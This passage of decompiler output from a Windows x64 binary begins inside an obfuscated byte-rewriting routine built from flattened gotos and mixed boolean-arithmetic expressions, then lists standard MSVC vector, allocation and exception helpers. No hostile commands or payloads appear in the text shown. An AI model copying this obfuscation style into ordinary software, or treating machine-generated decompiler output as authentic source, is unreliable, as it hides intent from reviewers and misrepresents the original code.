      uVar8 = uVar17 + 5;
      uVar3 = uVar17 + 0x7f;
      if (uVar8 < uVar17 + 0xc1) {
        local_e8 = (cVar11 - 0x39U) + bVar18 + (bVar18 & cVar11 - 0x39U) * -2 + 0x8f;
        goto LAB_14000d560;
      }
      if (uVar8 < uVar17 + 0xc0) {
        local_e8 = bVar18 + cVar11 + 0x7bU + (cVar11 + 0x7bU & bVar18) * -2 + 0xa3;
        uVar17 = uVar3;
        goto LAB_14000d582;
      }
      if (uVar8 < uVar17 + 0x87) {
        local_e8 = bVar18 + cVar11 + 0x55U + (cVar11 + 0x55U & bVar18) * -2 + 0xad;
        uVar17 = uVar3;
        goto LAB_14000d5f4;
      }
      if (uVar8 < uVar17 + 0xff) break;
      if (uVar8 < uVar17 + 0xa9) {
        local_e8 = (bVar18 + cVar11 + 9U + (cVar11 + 9U & bVar18) * -2) - 0x3f;
        uVar17 = uVar3;
        goto LAB_14000da00;
      }
      if (uVar8 < uVar17 + 0x89) {
        local_e8 = (bVar18 + (cVar11 - 0x1dU) + (cVar11 - 0x1dU & bVar18) * -2) - 0x35;
        uVar17 = uVar3;
        goto LAB_14000d9b6;
      }
      if (uVar8 < uVar17 + 0x467) {
        local_e8 = (bVar18 + cVar11 + 0xbdU + (cVar11 + 0xbdU & bVar18) * -2) - 0x2b;
        uVar17 = uVar3;
        goto LAB_14000d97b;
      }
      if (uVar8 < uVar17 + 0x81) {
        local_e8 = (bVar18 + cVar11 + 0x97U + (cVar11 + 0x97U & bVar18) * -2) - 0x21;
        uVar17 = uVar3;
        goto LAB_14000d959;
      }
      if (uVar17 + 0x9f <= uVar8) {
        uVar8 = uVar17 + 0x47f;
        uVar3 = uVar17 + 0x49f;
        if (uVar17 + 0x4a2 < uVar8) {
          local_e8 = (bVar18 + cVar11 + 0xb8U + (cVar11 + 0xb8U & bVar18) * -2) - 8;
          uVar14 = uVar14 + *(byte *)((longlong)local_88 + (uVar14 - 0x30)) + uVar3 + 1;
          uVar17 = uVar3;
          goto LAB_14000d572;
        }
        if (uVar17 + 0x4c7 < uVar8) {
          local_e8 = ('\x01' - (cVar11 + 0x92U & bVar18)) * '\x02' + cVar11 + 0x92U + bVar18;
          uVar17 = uVar3;
          goto LAB_14000dfcf;
        }
        if (uVar17 + 0x500 < uVar8) {
          local_e8 = ('\x06' - (cVar11 + 0x6cU & bVar18)) * '\x02' + cVar11 + 0x6cU + bVar18;
          uVar17 = uVar3;
          goto LAB_14000dfa9;
        }
        if (uVar17 + 0x4a4 < uVar8) {
          local_e8 = ('\v' - (cVar11 + 0x46U & bVar18)) * '\x02' + cVar11 + 0x46U + bVar18;
          uVar17 = uVar3;
          goto LAB_14000df7b;
        }
        if (uVar17 + 0x4e1 < uVar8) {
          local_e8 = ('\x10' - (cVar11 + 0x20U & bVar18)) * '\x02' + cVar11 + 0x20U + bVar18;
          uVar8 = uVar8 + uVar3;
          uVar17 = uVar3;
          goto LAB_14000df7b;
        }
        if (uVar17 + 0x4e0 < uVar8) {
          local_e8 = ('\x15' - (cVar11 - 6U & bVar18)) * '\x02' + (cVar11 - 6U) + bVar18;
          uVar17 = uVar3;
          goto LAB_14000dea3;
        }
        if (uVar17 + 0x4a7 < uVar8) {
          local_e8 = ('\x1a' - (cVar11 - 0x2cU & bVar18)) * '\x02' + (cVar11 - 0x2cU) + bVar18;
          uVar17 = uVar3;
          goto LAB_14000d572;
        }
        if (uVar17 + 0x51f < uVar8) {
          local_e8 = ('$' - (cVar11 + 0x88U & bVar18)) * '\x02' + cVar11 + 0x88U + bVar18;
          uVar17 = uVar3;
          goto LAB_14000def9;
        }
        if (uVar8 <= uVar17 + 0x4c9) {
          uVar8 = uVar17 + 0x69f;
          uVar3 = uVar17 + 0x6a9;
        }
      }
    }
    local_e8 = bVar18 + cVar11 + 0x2fU + (cVar11 + 0x2fU & bVar18) * -2 + 0xb7;
    uVar17 = uVar3;
  }
  if (uVar17 + 4 <= uVar8) {
    if (uVar8 == uVar17 + 1) {
      local_e8 = (bVar18 + (cVar11 - 0x1eU) + (cVar11 - 0x1eU & bVar18) * -2) - 0x2e;
      uVar14 = uVar14 + *(byte *)((longlong)local_88 + (uVar14 - 0x30)) + uVar17 + 1;
      goto LAB_14000d572;
    }
    if (uVar8 == uVar17 + 2) {
      local_e8 = (bVar18 + cVar11 + 0xbcU + (cVar11 + 0xbcU & bVar18) * -2) - 0x24;
LAB_14000dfcf:
      bVar10 = (char)uVar14 - 4;
      *(byte *)((longlong)local_88 + (uVar14 - 0x30)) =
           ('\x0e' - (bVar18 & bVar10)) * '\x02' + bVar18 + bVar10;
      uVar8 = uVar8 + 1;
      lVar15 = uVar14 + (-1 - uVar8);
      uVar14 = lVar15 + *(byte *)((longlong)local_88 + lVar15 + -0x30) + uVar17 + 1;
      goto LAB_14000d572;
    }
    if (uVar8 == uVar17 + 4) {
      local_e8 = (bVar18 + cVar11 + 0x4aU + (cVar11 + 0x4aU & bVar18) * -2) - 6;
      uVar8 = uVar8 + uVar17;
      goto LAB_14000df7b;
    }
    if (uVar8 != uVar17 + 3) {
      if (uVar8 != uVar17 + 3) goto LAB_14000da00;
      local_e8 = ('\f' - (cVar11 - 0x28U & bVar18)) * '\x02' + (cVar11 - 0x28U) + bVar18;
      uVar17 = uVar17 + 1;
      goto LAB_14000d572;
    }
    local_e8 = ('\x02' - (cVar11 + 0x24U & bVar18)) * '\x02' + cVar11 + 0x24U + bVar18;
LAB_14000dea3:
    *(byte *)((longlong)local_88 + (uVar14 - 0x30)) =
         bVar18 + (bVar18 & cVar11 + 0xb5U) * -2 + '\r' + local_e8 + cVar11 + 0xb5U;
    uVar8 = uVar8 + uVar17;
LAB_14000df7b:
    uVar14 = uVar14 - local_e8;
    goto LAB_14000d572;
  }
  local_e8 = bVar18 + cVar11 + 0x6dU + (cVar11 + 0x6dU & bVar18) * -2 + 5;
LAB_14000da00:
  if (uVar17 + uVar8 == 1000) {
    local_e8 = ('\t' - (bVar18 & cVar11 + 0x22U)) * '\x02' + cVar11 + 0x22U;
    goto LAB_14000dfa9;
  }
  if (uVar17 + 0x10 < uVar8) {
    local_e8 = bVar18 + (cVar11 - 7U) + (cVar11 - 7U & bVar18) * -2 + 0x31;
LAB_14000d9b6:
    if (0x7f < uVar8) {
      bVar10 = cVar11 + 0x48;
      cVar19 = ((bVar18 - (bVar18 & bVar10)) + '\x04') * '\x02';
LAB_14000dea0:
      local_e8 = cVar19 + bVar10;
      goto LAB_14000dea3;
    }
    if (uVar17 + 9 < uVar8) {
      local_e8 = bVar18 + (bVar18 & cVar11 - 0x16U) * -2 + -0x66 + (cVar11 - 0x16U);
    }
    else {
      if (uVar8 == uVar17 + 1) {
        local_e8 = (cVar11 - 0x3cU) + bVar18 + (bVar18 & cVar11 - 0x3cU) * -2 + 0xa4;
        uVar14 = uVar14 + *(byte *)((longlong)local_88 + (uVar14 - 0x30)) + uVar17 + 1;
        goto LAB_14000d572;
      }
      if (uVar8 == uVar17 + 2) {
        local_e8 = bVar18 + (bVar18 & cVar11 + 0x78U) * -2 + -0x48 + cVar11 + 0x78U;
        goto LAB_14000dfa9;
      }
      if (uVar8 == uVar17 + 5) {
        local_e8 = (cVar11 + 0x2cU + bVar18 + (bVar18 & cVar11 + 0x2cU) * -2) - 0x34;
        uVar8 = uVar8 + uVar17;
        goto LAB_14000df7b;
      }
      if (uVar8 == uVar17 + 4) {
        bVar10 = cVar11 + 6;
        cVar19 = bVar18 + (bVar18 & bVar10) * -2 + -0x2a;
        goto LAB_14000dea0;
      }
      if (uVar8 == uVar17 + 6) {
        local_e8 = ((cVar11 - 0x20U) + bVar18 + (bVar18 & cVar11 - 0x20U) * -2) - 0x20;
        goto LAB_14000d572;
      }
      if (uVar8 == uVar17 + 8) {
        bVar10 = cVar11 + 0x94;
        cVar19 = bVar18 + (bVar18 & bVar10) * -2 + -0xc;
        goto LAB_14000def6;
      }
    }
LAB_14000d97b:
    if (uVar17 < 5) {
LAB_14000d959:
      *(byte *)((longlong)local_88 + (uVar14 - 0x30)) = local_e8;
      uVar14 = uVar14 + 1;
      goto LAB_14000d572;
    }
    local_e8 = (bVar18 + (bVar18 & cVar11 + 0x6eU) * -2 + cVar11 + 0x6eU) * '\x02' - 4;
  }
  else {
    if (uVar8 != uVar17 + 1) {
      if (uVar8 == uVar17 + 2) {
        local_e8 = bVar18 + cVar11 + 0xadU + (cVar11 + 0xadU & bVar18) * -2 + 0x45;
        uVar17 = uVar17 + 1;
        goto LAB_14000d572;
      }
      if (uVar8 != uVar17 + 3) {
        if (uVar8 == uVar17 + 6) {
          local_e8 = cVar11 + 0x15U + bVar18 + (bVar18 & cVar11 + 0x15U) * -2 + 0x6d;
          goto LAB_14000df7b;
        }
        if (uVar8 == uVar17 + 4) {
          local_e8 = bVar18 + (bVar18 & cVar11 - 0x11U) * -2 + 'w' + (cVar11 - 0x11U);
          goto LAB_14000dfa9;
        }
        if (uVar8 != uVar17 + 9) goto LAB_14000d9b6;
        local_e8 = cVar11 + 0xa3U + bVar18 + (bVar18 & cVar11 + 0xa3U) * -2 + 0x8b;
        uVar14 = uVar14 + *(byte *)((longlong)local_88 + (uVar14 - 0x30)) + uVar17 + 1;
        goto LAB_14000d572;
      }
      local_e8 = cVar11 + 0x3bU + bVar18 + (bVar18 & cVar11 + 0x3bU) * -2 + 99;
      uVar8 = uVar8 + uVar17;
      goto LAB_14000df7b;
    }
    local_e8 = bVar18 + (cVar11 - 0x2dU) + (cVar11 - 0x2dU & bVar18) * -2 + 0x3b;
  }
LAB_14000def9:
  *(byte *)((longlong)local_88 + (uVar14 - 0x30)) =
       bVar18 + (bVar18 & cVar11 - 0x25U) * -2 + '\x03' + (cVar11 - 0x25U);
  uVar17 = uVar17 + 1;
  goto LAB_14000d572;
}



/* ==================================================================== */
/* FUN_14000e200 @ 14000e200 */

void FUN_14000e200(longlong *param_1,ulonglong param_2)

{
  longlong lVar1;
  longlong lVar2;
  void *pvVar3;
  void *_Dst;
  void *_Memory;

  lVar1 = *param_1;
  if ((ulonglong)(param_1[2] - lVar1 >> 3) < param_2) {
    if (0x1fffffffffffffff < param_2) {
                    /* WARNING: Subroutine does not return */
      FUN_14000e380();
    }
    lVar2 = param_1[1];
    _Dst = (void *)FUN_14000e6b0(param_2 * 8);
    memmove(_Dst,(void *)*param_1,param_1[1] - *param_1);
    pvVar3 = (void *)*param_1;
    if (pvVar3 != (void *)0x0) {
      _Memory = pvVar3;
      if ((0xfff < (param_1[2] - (longlong)pvVar3 & 0xfffffffffffffff8U)) &&
         (_Memory = *(void **)((longlong)pvVar3 + -8),
         0x1f < (ulonglong)((longlong)pvVar3 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
        _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      free(_Memory);
    }
    *param_1 = (longlong)_Dst;
    param_1[1] = (longlong)((longlong)_Dst + (lVar2 - lVar1 >> 3) * 8);
    param_1[2] = (longlong)(param_2 * 8 + (longlong)_Dst);
  }
  return;
}



/* ==================================================================== */
/* FUN_14000e300 @ 14000e300 */

void FUN_14000e300(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;

  pvVar1 = (void *)*param_1;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < (param_1[2] - (longlong)pvVar1 & 0xfffffffffffffff8U)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* ==================================================================== */
/* thunk_FUN_14000e720 @ 14000e370 */

void thunk_FUN_14000e720(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;

  pvVar1 = (void *)*param_1;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < (param_1[2] - (longlong)pvVar1 & 0xfffffffffffffffcU)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* ==================================================================== */
/* FUN_14000e380 @ 14000e380 */

void FUN_14000e380(void)

{
  code *pcVar1;

  std::_Xlength_error("vector too long");
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* ==================================================================== */
/* FUN_14000e3a0 @ 14000e3a0 */

void FUN_14000e3a0(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;

  pvVar1 = (void *)*param_1;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < (ulonglong)(param_1[2] - (longlong)pvVar1)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* ==================================================================== */
/* thunk_FUN_14000e3a0 @ 14000e410 */

void thunk_FUN_14000e3a0(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;

  pvVar1 = (void *)*param_1;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < (ulonglong)(param_1[2] - (longlong)pvVar1)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* ==================================================================== */
/* FUN_14000e420 @ 14000e420 */

undefined8 * FUN_14000e420(undefined8 *param_1,longlong *param_2)

{
  void *_Dst;
  ulonglong uVar1;
  size_t _Size;

  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar1 = param_2[1] - *param_2;
  if (uVar1 != 0) {
    if (0x7fffffffffffffff < uVar1) {
                    /* WARNING: Subroutine does not return */
      FUN_14000e380();
    }
    _Dst = (void *)FUN_14000e6b0(uVar1);
    *param_1 = _Dst;
    param_1[1] = _Dst;
    param_1[2] = (longlong)_Dst + uVar1;
    _Size = param_2[1] - *param_2;
    memmove(_Dst,(void *)*param_2,_Size);
    param_1[1] = _Size + (longlong)_Dst;
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_14000e4b0 @ 14000e4b0 */

void FUN_14000e4b0(longlong param_1,undefined8 *param_2)

{
  if (*(undefined8 **)(param_1 + 8) == *(undefined8 **)(param_1 + 0x10)) {
    FUN_14000e790();
    return;
  }
  **(undefined8 **)(param_1 + 8) = *param_2;
  *(longlong *)(param_1 + 8) = *(longlong *)(param_1 + 8) + 8;
  return;
}



/* ==================================================================== */
/* FUN_14000e4e0 @ 14000e4e0 */

void FUN_14000e4e0(longlong *param_1,ulonglong param_2)

{
  void *pvVar1;
  longlong lVar2;
  void *_Dst;
  ulonglong uVar3;
  void *_Memory;
  ulonglong uVar4;
  ulonglong uVar5;

  pvVar1 = (void *)param_1[1];
  lVar2 = *param_1;
  uVar5 = (longlong)pvVar1 - lVar2;
  if (param_2 < uVar5) {
    param_1[1] = lVar2 + param_2;
    return;
  }
  if (uVar5 < param_2) {
    uVar3 = param_1[2] - lVar2;
    if (param_2 <= uVar3) {
      memset(pvVar1,0,param_2 - uVar5);
      param_1[1] = (param_2 - uVar5) + (longlong)pvVar1;
      return;
    }
    if (0x7fffffffffffffff < param_2) {
                    /* WARNING: Subroutine does not return */
      FUN_14000e380();
    }
    uVar4 = 0x7fffffffffffffff;
    if ((uVar3 <= 0x7fffffffffffffff - (uVar3 >> 1)) &&
       (uVar4 = uVar3 + (uVar3 >> 1), uVar4 < param_2)) {
      uVar4 = param_2;
    }
    _Dst = (void *)FUN_14000e6b0(uVar4);
    memset((void *)(uVar5 + (longlong)_Dst),0,param_2 - uVar5);
    memmove(_Dst,(void *)*param_1,param_1[1] - *param_1);
    pvVar1 = (void *)*param_1;
    if (pvVar1 != (void *)0x0) {
      _Memory = pvVar1;
      if ((0xfff < (ulonglong)(param_1[2] - (longlong)pvVar1)) &&
         (_Memory = *(void **)((longlong)pvVar1 + -8),
         0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
        _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      free(_Memory);
    }
    *param_1 = (longlong)_Dst;
    param_1[1] = param_2 + (longlong)_Dst;
    param_1[2] = uVar4 + (longlong)_Dst;
  }
  return;
}



/* ==================================================================== */
/* FUN_14000e640 @ 14000e640 */

void FUN_14000e640(undefined8 *param_1,ulonglong param_2)

{
  void *_Dst;

  if (param_2 != 0) {
    if (0x7fffffffffffffff < param_2) {
                    /* WARNING: Subroutine does not return */
      FUN_14000e380();
    }
    _Dst = (void *)FUN_14000e6b0(param_2);
    *param_1 = _Dst;
    param_1[2] = param_2 + (longlong)_Dst;
    memset(_Dst,0,param_2);
    param_1[1] = param_2 + (longlong)_Dst;
  }
  return;
}



/* ==================================================================== */
/* FUN_14000e6b0 @ 14000e6b0 */

ulonglong FUN_14000e6b0(ulonglong param_1)

{
  longlong lVar1;
  ulonglong uVar2;

  if (param_1 == 0) {
    return 0;
  }
  if (param_1 < 0x1000) {
    uVar2 = FUN_140051870();
    return uVar2;
  }
  if (param_1 + 0x27 <= param_1) {
                    /* WARNING: Subroutine does not return */
    FUN_140009c90();
  }
  lVar1 = FUN_140051870(param_1 + 0x27);
  if (lVar1 == 0) {
                    /* WARNING: Subroutine does not return */
    _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  uVar2 = lVar1 + 0x27U & 0xffffffffffffffe0;
  *(longlong *)(uVar2 - 8) = lVar1;
  return uVar2;
}



/* ==================================================================== */
/* FUN_14000e720 @ 14000e720 */

void FUN_14000e720(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;

  pvVar1 = (void *)*param_1;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < (param_1[2] - (longlong)pvVar1 & 0xfffffffffffffffcU)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* ==================================================================== */
/* FUN_14000e790 @ 14000e790 */

void * FUN_14000e790(longlong *param_1,void *param_2,undefined8 *param_3)

{
  ulonglong uVar1;
  void *pvVar2;
  longlong lVar3;
  void *pvVar4;
  longlong lVar5;
  void *_Dst;
  ulonglong uVar6;
  ulonglong uVar7;
  void *pvVar8;
  longlong lVar9;
  size_t _Size;

  lVar3 = *param_1;
  lVar9 = (longlong)param_2 - lVar3 >> 3;
  lVar5 = param_1[1] - lVar3 >> 3;
  if (lVar5 == 0x1fffffffffffffff) {
                    /* WARNING: Subroutine does not return */
    FUN_14000e380();
  }
  uVar6 = param_1[2] - lVar3 >> 3;
  uVar1 = lVar5 + 1;
  if (0x1fffffffffffffff - (uVar6 >> 1) < uVar6) {
    uVar7 = 0x1fffffffffffffff;
  }
  else {
    uVar6 = (uVar6 >> 1) + uVar6;
    uVar7 = uVar1;
    if (uVar1 <= uVar6) {
      uVar7 = uVar6;
    }
    if (0x1fffffffffffffff < uVar7) {
                    /* WARNING: Subroutine does not return */
      FUN_140009c90();
    }
  }
  _Dst = (void *)FUN_14000e6b0(uVar7 * 8);
  *(undefined8 *)((longlong)_Dst + lVar9 * 8) = *param_3;
  pvVar4 = (void *)*param_1;
  pvVar2 = (void *)((longlong)_Dst + lVar9 * 8);
  if (param_2 == (void *)param_1[1]) {
    _Size = param_1[1] - (longlong)pvVar4;
    pvVar8 = _Dst;
    param_2 = pvVar4;
  }
  else {
    memmove(_Dst,pvVar4,(longlong)param_2 - (longlong)pvVar4);
    pvVar8 = (void *)((longlong)pvVar2 + 8);
    _Size = param_1[1] - (longlong)param_2;
  }
  memmove(pvVar8,param_2,_Size);
  pvVar4 = (void *)*param_1;
  if (pvVar4 != (void *)0x0) {
    pvVar8 = pvVar4;
    if ((0xfff < (param_1[2] - (longlong)pvVar4 & 0xfffffffffffffff8U)) &&
       (pvVar8 = *(void **)((longlong)pvVar4 + -8),
       0x1f < (ulonglong)((longlong)pvVar4 + (-8 - (longlong)pvVar8)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(pvVar8);
  }
  *param_1 = (longlong)_Dst;
  param_1[1] = (longlong)((longlong)_Dst + uVar1 * 8);
  param_1[2] = (longlong)(uVar7 * 8 + (longlong)_Dst);
  return pvVar2;
}



/* ==================================================================== */
/* FUN_14000e910 @ 14000e910 */

void * FUN_14000e910(longlong *param_1,void *param_2,undefined4 *param_3)

{
  ulonglong uVar1;
  void *pvVar2;
  longlong lVar3;
  void *pvVar4;
  longlong lVar5;
  void *_Dst;
  ulonglong uVar6;
  ulonglong uVar7;
  void *pvVar8;
  longlong lVar9;
  size_t _Size;

  lVar3 = *param_1;
  lVar9 = (longlong)param_2 - lVar3 >> 2;
  lVar5 = param_1[1] - lVar3 >> 2;
  if (lVar5 == 0x3fffffffffffffff) {
                    /* WARNING: Subroutine does not return */
    FUN_14000e380();
  }
  uVar6 = param_1[2] - lVar3 >> 2;
  uVar1 = lVar5 + 1;
  if (0x3fffffffffffffff - (uVar6 >> 1) < uVar6) {
    uVar7 = 0x3fffffffffffffff;
  }
  else {
    uVar6 = (uVar6 >> 1) + uVar6;
    uVar7 = uVar1;
    if (uVar1 <= uVar6) {
      uVar7 = uVar6;
    }
    if (0x3fffffffffffffff < uVar7) {
                    /* WARNING: Subroutine does not return */
      FUN_140009c90();
    }
  }
  _Dst = (void *)FUN_14000e6b0(uVar7 * 4);
  *(undefined4 *)((longlong)_Dst + lVar9 * 4) = *param_3;
  pvVar4 = (void *)*param_1;
  pvVar2 = (void *)((longlong)_Dst + lVar9 * 4);
  if (param_2 == (void *)param_1[1]) {
    _Size = param_1[1] - (longlong)pvVar4;
    pvVar8 = _Dst;
    param_2 = pvVar4;
  }
  else {
    memmove(_Dst,pvVar4,(longlong)param_2 - (longlong)pvVar4);
    pvVar8 = (void *)((longlong)pvVar2 + 4);
    _Size = param_1[1] - (longlong)param_2;
  }
  memmove(pvVar8,param_2,_Size);
  pvVar4 = (void *)*param_1;
  if (pvVar4 != (void *)0x0) {
    pvVar8 = pvVar4;
    if ((0xfff < (param_1[2] - (longlong)pvVar4 & 0xfffffffffffffffcU)) &&
       (pvVar8 = *(void **)((longlong)pvVar4 + -8),
       0x1f < (ulonglong)((longlong)pvVar4 + (-8 - (longlong)pvVar8)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(pvVar8);
  }
  *param_1 = (longlong)_Dst;
  param_1[1] = (longlong)((longlong)_Dst + uVar1 * 4);
  param_1[2] = (longlong)(uVar7 * 4 + (longlong)_Dst);
  return pvVar2;
}



/* ==================================================================== */
/* FUN_14000ea90 @ 14000ea90 */

undefined * FUN_14000ea90(void)

{
  return &DAT_140a618a0;
}



/* ==================================================================== */
/* FUN_14000eaa0 @ 14000eaa0 */

int FUN_14000eaa0(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  int iVar1;
  undefined8 *puVar2;
  undefined8 local_res20;

  local_res20 = param_4;
  puVar2 = (undefined8 *)FUN_14000ea90();
  iVar1 = __stdio_common_vsprintf_s(*puVar2,param_1,param_2,param_3,0,&local_res20);
  if (iVar1 < 0) {
    iVar1 = -1;
  }
  return iVar1;
}



/* ==================================================================== */
/* FUN_14000eb00 @ 14000eb00 */

void FUN_14000eb00(void)

{
  code *pcVar1;

  std::_Xlength_error("string too long");
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* ==================================================================== */
/* FUN_14000eb20 @ 14000eb20 */

undefined8 * FUN_14000eb20(undefined8 *param_1,longlong param_2)

{
  *param_1 = &PTR_FUN_140056e78;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  *param_1 = &PTR_FUN_140056fc0;
  return param_1;
}



/* ==================================================================== */
/* FUN_14000eb70 @ 14000eb70 */

undefined8 FUN_14000eb70(longlong *param_1,undefined4 param_2,int *param_3)

{
  int *piVar1;
  undefined1 local_18 [16];

  piVar1 = (int *)(**(code **)(*param_1 + 0x18))(param_1,local_18,param_2);
  if ((*(longlong *)(*(longlong *)(piVar1 + 2) + 8) == *(longlong *)(*(longlong *)(param_3 + 2) + 8)
      ) && (*piVar1 == *param_3)) {
    return 1;
  }
  return 0;
}



/* ==================================================================== */
/* FUN_14000ebd0 @ 14000ebd0 */

undefined4 * FUN_14000ebd0(undefined4 *param_1)

{
  *param_1 = 0x16;
  *(undefined ***)(param_1 + 2) = &PTR_PTR_140a60ce8;
  return param_1;
}



/* ==================================================================== */
/* FUN_14000ebf0 @ 14000ebf0 */

undefined8 * FUN_14000ebf0(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = &PTR_FUN_140056e78;
  __std_exception_destroy(param_1 + 1);
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_14000ec40 @ 14000ec40 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 ** FUN_14000ec40(undefined8 **param_1,undefined8 *param_2)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  undefined1 auStack_68 [32];
  undefined8 ***local_48 [3];
  ulonglong local_30;
  undefined8 ***local_28;
  undefined1 local_20;
  ulonglong local_18;

  local_18 = DAT_14005d040 ^ (ulonglong)auStack_68;
  local_28 = (undefined8 ***)param_1;
  (**(code **)(*(longlong *)param_2[1] + 0x10))
            ((longlong *)param_2[1],local_48,*(undefined4 *)param_2);
  *param_1 = &PTR_FUN_140056e78;
  local_20 = 1;
  local_28 = local_48;
  if (0xf < local_30) {
    local_28 = local_48[0];
  }
  param_1[1] = (undefined8 *)0x0;
  param_1[2] = (undefined8 *)0x0;
  __std_exception_copy(&local_28);
  *param_1 = &PTR_FUN_140056fc0;
  FUN_140025000(local_48);
  puVar1 = (undefined8 *)*param_2;
  puVar2 = (undefined8 *)param_2[1];
  *param_1 = &PTR_FUN_140057030;
  param_1[3] = puVar1;
  param_1[4] = puVar2;
  return param_1;
}



/* ==================================================================== */
/* FUN_14000ed00 @ 14000ed00 */

void FUN_14000ed00(void)

{
  undefined4 *puVar1;
  undefined4 local_58;
  undefined4 uStack_54;
  undefined4 uStack_50;
  undefined4 uStack_4c;
  undefined1 local_48 [16];
  undefined1 local_38 [56];

  puVar1 = (undefined4 *)FUN_14000ebd0(local_48);
  local_58 = *puVar1;
  uStack_54 = puVar1[1];
  uStack_50 = puVar1[2];
  uStack_4c = puVar1[3];
  FUN_14000ec40(local_38,&local_58);
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_38,(ThrowInfo *)&DAT_14005a230);
}



/* ==================================================================== */
/* FUN_14000ed40 @ 14000ed40 */

undefined8 * FUN_14000ed40(undefined8 *param_1,longlong param_2)

{
  undefined8 uVar1;
  undefined8 uVar2;

  *param_1 = &PTR_FUN_140056e78;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  *param_1 = &PTR_FUN_140056fd8;
  uVar1 = *(undefined8 *)(param_2 + 0x18);
  uVar2 = *(undefined8 *)(param_2 + 0x20);
  *param_1 = &PTR_FUN_140057030;
  param_1[3] = uVar1;
  param_1[4] = uVar2;
  return param_1;
}



/* ==================================================================== */
/* FUN_14000eda0 @ 14000eda0 */

undefined8 * FUN_14000eda0(undefined8 *param_1,longlong param_2)

{
  undefined8 uVar1;

  *param_1 = &PTR_FUN_140056e78;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  *param_1 = &PTR_FUN_140056fd8;
  uVar1 = *(undefined8 *)(param_2 + 0x20);
  param_1[3] = *(undefined8 *)(param_2 + 0x18);
  param_1[4] = uVar1;
  return param_1;
}



/* ==================================================================== */
/* FUN_14000ee10 @ 14000ee10 */

undefined8 * FUN_14000ee10(undefined8 param_1,undefined8 *param_2,int param_3)

{
  char *pcVar1;
  longlong lVar2;

  pcVar1 = std::_Syserror_map(param_3);
  lVar2 = -1;
  *param_2 = 0;
  param_2[1] = 0;
  param_2[2] = 0;
  param_2[3] = 0;
  do {
    lVar2 = lVar2 + 1;
  } while (pcVar1[lVar2] != '\0');
  FUN_140024ce0(param_2,pcVar1);
  return param_2;
}



/* ==================================================================== */
/* FUN_14000ee60 @ 14000ee60 */

void * FUN_14000ee60(void *param_1,ulonglong param_2)

{
  if ((param_2 & 1) != 0) {
    free(param_1);
